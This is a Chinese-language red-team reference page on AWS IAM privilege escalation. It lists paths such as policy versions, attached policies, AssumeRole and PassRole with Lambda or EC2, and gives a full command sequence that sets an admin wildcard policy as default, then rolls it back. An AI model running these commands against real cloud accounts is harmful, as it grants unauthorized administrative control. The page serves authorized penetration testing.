# AWS IAM 提权路径

先从 `/cloud-recon` 的 PMapper/Trust/Policy 结果选最短路径。不要因为某个 Action 名出现就默认可利用；检查 Resource、Condition、Permission Boundary、SCP、Session Policy。

## 1. Policy Version

条件：`iam:CreatePolicyVersion` 且能对当前高价值 customer-managed policy 创建版本。

```bash
aws iam get-policy --policy-arn <POLICY_ARN>
aws iam list-policy-versions --policy-arn <POLICY_ARN>
```

保存原 default version。

**完整最小验证（授权靶场直接打）：**

```bash
# 1. 备份
aws iam get-policy-version --policy-arn $ARN --version-id v1 > policy-v1.json

# 2. 写最小提权文档（例如给当前角色加 iam:PassRole + lambda:CreateFunction 或 AdministratorAccess 测试）
cat > /tmp/privesc.json <<'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
EOF

aws iam create-policy-version \
  --policy-arn $ARN \
  --policy-document file:///tmp/privesc.json \
  --set-as-default

# 3. 用新权限证明控制：列出/创建验证资源，或 sts get-caller-identity 后执行原先被拒的 API
aws iam list-users

# 4. 立刻回滚
aws iam set-default-policy-version --policy-arn $ARN --version-id v1
aws iam delete-policy-version --policy-arn $ARN --version-id v2
```

这是攻击，不是“只证明 API 存在”。测完必须回滚。SCP / Permission Boundary / session policy 仍可能挡住 `*`，失败时把边界记下来，换 PassRole+Lambda 等更窄路径。

## 2. Attach / Put Policy

```text
iam:AttachUserPolicy / AttachRolePolicy
iam:PutUserPolicy / PutRolePolicy
```

先保存原 attached/inline policy，再使用最小范围测试 policy 验证权限提升；测试完成恢复。

## 3. AssumeRole

条件：

```text
caller permits sts:AssumeRole
+
target trust permits caller
+
conditions satisfied
```

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::<ACCOUNT>:role/<ROLE> \
  --role-session-name redteam
```

## 4. PassRole + Lambda

条件：

```text
iam:PassRole on high-priv role
+
lambda:CreateFunction or update path
+
invoke ability / trigger
```

思路：让 Lambda 以高权 execution role 执行，然后通过函数输出/受控网络验证身份。

具体 → `aws-serverless.md`。

## 5. PassRole + EC2

条件：`iam:PassRole` + EC2 instance/profile 相关创建/修改权限。

目标是获得挂载高权 role 的计算执行上下文；若最终获得主机 shell，OS 后渗透属于 `/post`。

## 6. UpdateAssumeRolePolicy

`iam:UpdateAssumeRolePolicy` 可改变谁能 AssumeRole，既可用于提权也可用于 cloud-native persistence。

操作/回滚见 `aws-persistence.md`。

## 7. Lambda UpdateFunctionCode / Configuration

```text
lambda:UpdateFunctionCode
lambda:UpdateFunctionConfiguration
```

可能直接影响已有高权 execution role。先确认生产影响和触发方式。

## 8. 其他 service + PassRole

常见服务：

```text
Glue
SageMaker
CloudFormation
ECS Tasks
CodeBuild
Step Functions
```

原则相同：当前 principal 能创建/修改服务资源 + `iam:PassRole` 给高权角色 + 有办法触发服务执行。

## 9. Source

- Rhino Security Labs IAM PrivEsc research: https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation
- AWS IAM: https://docs.aws.amazon.com/IAM/latest/UserGuide/
